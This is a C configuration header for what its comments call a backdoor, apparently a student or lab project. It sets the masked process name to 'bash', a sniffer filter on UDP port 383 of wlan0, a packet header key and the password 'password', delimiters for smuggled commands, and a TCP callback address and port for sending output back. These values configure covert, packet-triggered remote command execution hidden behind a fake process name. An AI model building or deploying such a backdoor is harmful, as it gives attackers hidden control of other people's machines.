#ifndef CONFIG
#define CONFIG

/*Mask*/
#define MASK "bash"
/* backdoor */
#define SNIFFER_FILTER "udp dst port 383"
#define NIC_NAME "wlan0"

/* packet_handler */
#define BACKDOOR_HEADER_KEY "noob"
#define BACKDOOR_HEADER_LEN 4
#define PASSWORD "password"
#define PASSLEN 8
#define COMMAND_START "start["
#define COMMAND_END "]end"
#define MAX_SIZE 1024
#define ETHER_IP_UDP_LEN 42

/* tcp_sender */
#define CLIENT_IP "192.168.1.69"
#define CLIENT_PORT "8000"

#endif